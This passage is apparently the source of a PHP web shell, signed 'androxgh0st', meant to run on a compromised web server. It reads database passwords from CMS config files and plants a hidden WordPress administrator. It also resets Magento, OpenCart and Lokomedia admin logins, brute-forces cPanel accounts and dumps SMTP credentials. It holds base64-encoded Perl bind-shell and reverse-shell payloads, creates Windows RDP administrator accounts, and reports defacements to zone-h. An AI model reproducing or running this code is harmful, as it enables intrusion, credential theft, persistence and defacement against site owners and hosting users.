	                $id = $result[ID];
	                $q2 = $conn->query("SELECT * FROM $option ORDER BY option_id ASC");
	                $result2 = $q2->fetch_array();
	                $target = $result2[option_value];
	                if($target == '') {
	                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
	                } else {
	                        $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
	                }
	                $update = $conn->query("INSERT INTO $prefix (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`,`user_status`) VALUES ('1945', '$user_baru', MD5('$pass_baru'), 'Idiot People', 'androsec1337@gmail.com', '0')");
	                $meta1 = $conn->query("INSERT INTO $meta (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '1945', '$capa', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')");
	                $meta2 = $conn->query("INSERT INTO $meta (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '1945', '$level', '10')");
	                $delplug = $conn->query("UPDATE $option SET option_value = '' WHERE option_name = 'active_plugins'");
	                echo "Config => ".$file_conf."<br>";
	                echo "CMS => Wordpress<br>";
	                echo $url_target;
	                if(!$update OR !$conn OR !$meta OR !$meta2 OR !$delplug) {
	                        echo "Status => <font color=red>".$conn->error."</font><br><br>";
	                } else {
	                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
	                }
	                $conn->close();
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit User Config</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='androxgh0st' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='androxgh0st' placeholder='pass_baru'><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
} elseif($_GET['do'] == 'cpanel') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							
						} else {
							$i++;
							if(function_exists('posix_getpwuid')) {
								$domain_cp = file_get_contents("/etc/named.conf");	
								if($domain_cp == '') {
									$dom =  "<font color=red>gabisa ambil nama domain nya</font>";
								} else {
									preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
									foreach($domains_cp[1] as $dj) {
										$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
										$user_cp_url = $user_cp_url['name'];
										if($user_cp_url == $ucp) {
											$dom = "<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";
											break;
										}
									}
								}
							} else {
								$dom = "<font color=red>function is Disable by system</font>";
							}
							echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>) domain ($dom)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>androxgh0st.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?);x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/^[client]$/", $ambil)) {
					preg_match("/password=(.*?)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					} else {
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
} elseif($_GET['do'] == 'smtp') {
	echo "<center><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";
	function scj($dir) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			if(!is_file("$dir/$dirb")) continue;
			$ambil = file_get_contents("$dir/$dirb");
			$ambil = str_replace("$", "", $ambil);
			if(preg_match("/JConfig|joomla/", $ambil)) {
				$smtp_host = ambilkata($ambil,"smtphost = '","'");
				$smtp_auth = ambilkata($ambil,"smtpauth = '","'");
				$smtp_user = ambilkata($ambil,"smtpuser = '","'");
				$smtp_pass = ambilkata($ambil,"smtppass = '","'");
				$smtp_port = ambilkata($ambil,"smtpport = '","'");
				$smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
				echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
				echo "SMTP port: <font color=lime>$smtp_port</font><br>";
				echo "SMTP user: <font color=lime>$smtp_user</font><br>";
				echo "SMTP pass: <font color=lime>$smtp_pass</font><br>";
				echo "SMTP auth: <font color=lime>$smtp_auth</font><br>";
				echo "SMTP secure: <font color=lime>$smtp_secure</font><br><br>";
			}
		}
	}
	$smpt_hunter = scj($dir);
	echo $smpt_hunter;
} elseif($_GET['do'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=lime>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='androxgh0st'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
} elseif($_GET['do'] == 'adminer') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
}  elseif($_GET['do'] == 'network') {
	echo "<form method='post'>
	<u>Bind Port:</u> <br>
	PORT: <input type='text' placeholder='port' name='port_bind' value='6969'>
	<input type='submit' name='sub_bp' value='>>'>
	</form>
	<form method='post'>
	<u>Back Connect:</u> <br>
	Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>&nbsp;&nbsp;
	PORT: <input type='text' placeholder='port' name='port_bc' value='6969'>
	<input type='submit' name='sub_bc' value='>>'>
	</form>";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	if(isset($_POST['sub_bp'])) {
		$f_bp = fopen("/tmp/bp.pl", "w");
		fwrite($f_bp, base64_decode($bind_port_p));
		fclose($f_bp);

		$port = $_POST['port_bind'];
		$out = exe("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bp.pl")."</pre>";
		unlink("/tmp/bp.pl");
	}
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
	if(isset($_POST['sub_bc'])) {
		$f_bc = fopen("/tmp/bc.pl", "w");
		fwrite($f_bc, base64_decode($bind_connect_p));
		fclose($f_bc);

		$ipbc = $_POST['ip_bc'];
		$port = $_POST['port_bc'];
		$out = exe("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bc.pl")."</pre>";
		unlink("/tmp/bc.pl");
	}
} elseif($_GET['do'] == 'krdp_shell') {
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			$user = htmlspecialchars($_POST['user']);
			$pass = htmlspecialchars($_POST['pass']);
			if(preg_match("/$user/", exe("net user"))) {
				echo "[INFO] -> <font color=red>user <font color=lime>$user</font> sudah ada</font>";
			} else {
				$add_user   = exe("net user $user $pass /add");
    			$add_groups1 = exe("net localgroup Administrators $user /add");
    			$add_groups2 = exe("net localgroup Administrator $user /add");
    			$add_groups3 = exe("net localgroup Administrateur $user /add");
    			echo "[ RDP ACCOUNT INFO ]<br>
    			------------------------------<br>
    			IP: <font color=lime>".$ip."</font><br>
    			Username: <font color=lime>$user</font><br>
    			Password: <font color=lime>$pass</font><br>
    			------------------------------<br><br>
    			[ STATUS ]<br>
    			------------------------------<br>
    			";
    			if($add_user) {
    				echo "[add user] -> <font color='lime'>Berhasil</font><br>";
    			} else {
    				echo "[add user] -> <font color='red'>Gagal</font><br>";
    			}
    			if($add_groups1) {
        			echo "[add localgroup Administrators] -> <font color='lime'>Berhasil</font><br>";
    			} elseif($add_groups2) {
        		    echo "[add localgroup Administrator] -> <font color='lime'>Berhasil</font><br>";
    			} elseif($add_groups3) { 
        		    echo "[add localgroup Administrateur] -> <font color='lime'>Berhasil</font><br>";
    			} else {
    				echo "[add localgroup] -> <font color='red'>Gagal</font><br>";
    			}
    			echo "------------------------------<br>";
			}
		} elseif($_POST['s_opsi']) {
			$user = htmlspecialchars($_POST['r_user']);
			if($_POST['opsi'] == '1') {
				$cek = exe("net user $user");
				echo "Checking username <font color=lime>$user</font> ....... ";
				if(preg_match("/$user/", $cek)) {
					echo "[ <font color=lime>Sudah ada</font> ]<br>
					------------------------------<br><br>
					<pre>$cek</pre>";
				} else {
					echo "[ <font color=red>belum ada</font> ]";
				}
			} elseif($_POST['opsi'] == '2') {
				$cek = exe("net user $user androxgh0st");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>androxgh0st</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
					}
				} else {
					echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
				}
			} elseif($_POST['opsi'] == '3') {
				$cek = exe("net user $user /DELETE");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[remove user: <font color=lime>$user</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
					}
				} else {
					echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
				}
			} else {
				//
			}
		} else {
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='androxgh0st' required>
			<input type='text' name='pass' placeholder='password' value='androxgh0st' required>
			<input type='submit' name='create' value='>>'>
			</form>
			-- Option --<br>
			<form method='post'>
			<input type='text' name='r_user' placeholder='username' required>
			<select name='opsi'>
			<option value='1'>Cek Username</option>
			<option value='2'>Ubah Password</option>
			<option value='3'>Hapus Username</option>
			</select>
			<input type='submit' name='s_opsi' value='>>'>
			</form>
			";
		}
	} else {
		echo "<font color=red>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";
	}
} elseif($_GET['act'] == 'newfile') {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'newfolder') {
	if($_POST['new_save_folder']) {
		$new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$act = "<font color=red>permission denied</font>";
		} else {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'rename_dir') {
	if($_POST['dir_rename']) {
		$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
		if($dir_rename) {
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "<form method='post'>
	<input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
	<input type='submit' name='dir_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete_dir') {
	if(is_dir($dir)) {
		if(is_writable($dir)) {
			@rmdir($dir);
			@exe("rm -rf $dir");
			@exe("rmdir /s /q $dir");
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>could not remove ".basename($dir)."</font>";
		}
	}
	echo $act;
} elseif($_GET['act'] == 'view') {
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<font color=lime>Saved!</font>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Save' name='save' style='width: 500px;'>
	</form>";
} elseif($_GET['act'] == 'rename') {
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' name='do_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete') {
	$delete = unlink($_GET['file']);
	if($delete) {
		$act = "<script>window.location='?dir=".$dir."';</script>";
	} else {
		$act = "<font color=red>permission denied</font>";
	}
	echo $act;
} else {
	if(is_dir($dir) === true) {
		if(!is_readable($dir)) {
			echo "<font color=red>can't open directory. ( not readable )</font>";
		} else {
			echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
			<tr>
			<th class="th_home"><center>Name</center></th>
			<th class="th_home"><center>Type</center></th>
			<th class="th_home"><center>Size</center></th>
			<th class="th_home"><center>Last Modified</center></th>
			<th class="th_home"><center>Owner/Group</center></th>
			<th class="th_home"><center>Permission</center></th>
			<th class="th_home"><center>Action</center></th>
			</tr>';
			$scandir = scandir($dir);
			foreach($scandir as $dirx) {
				$dtype = filetype("$dir/$dirx");
				$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
				if(function_exists('posix_getpwuid')) {
					$downer = @posix_getpwuid(fileowner("$dir/$dirx"));
					$downer = $downer['name'];
				} else {
					//$downer = $uid;
					$downer = fileowner("$dir/$dirx");
				}
				if(function_exists('posix_getgrgid')) {
					$dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
					$dgrp = $dgrp['name'];
				} else {
					$dgrp = filegroup("$dir/$dirx");
				}
 				if(!is_dir("$dir/$dirx")) continue;
 				if($dirx === '..') {
 					$href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
 				} elseif($dirx === '.') {
 					$href = "<a href='?dir=$dir'>$dirx</a>";
 				} else {
 					$href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
 				}
 				if($dirx === '.' || $dirx === '..') {
 					$act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
 					} else {
 					$act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
 				}
 				echo "<tr>";
 				echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>$href</td>";
				echo "<td class='td_home'><center>$dtype</center></td>";
				echo "<td class='td_home'><center>-</center></th></td>";
				echo "<td class='td_home'><center>$dtime</center></td>";
				echo "<td class='td_home'><center>$downer/$dgrp</center></td>";
				echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
				echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
				echo "</tr>";
			}
		}
	} else {
		echo "<font color=red>can't open directory.</font>";
	}
		foreach($scandir as $file) {
			$ftype = filetype("$dir/$file");
			$ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
			$size = filesize("$dir/$file")/1024;
			$size = round($size,3);
			if(function_exists('posix_getpwuid')) {
				$fowner = @posix_getpwuid(fileowner("$dir/$file"));
				$fowner = $fowner['name'];
			} else {
				//$downer = $uid;
				$fowner = fileowner("$dir/$file");
			}
			if(function_exists('posix_getgrgid')) {
				$fgrp = @posix_getgrgid(filegroup("$dir/$file"));
				$fgrp = $fgrp['name'];
			} else {
				$fgrp = filegroup("$dir/$file");
			}
			if($size > 1024) {
				$size = round($size/1024,2). 'MB';
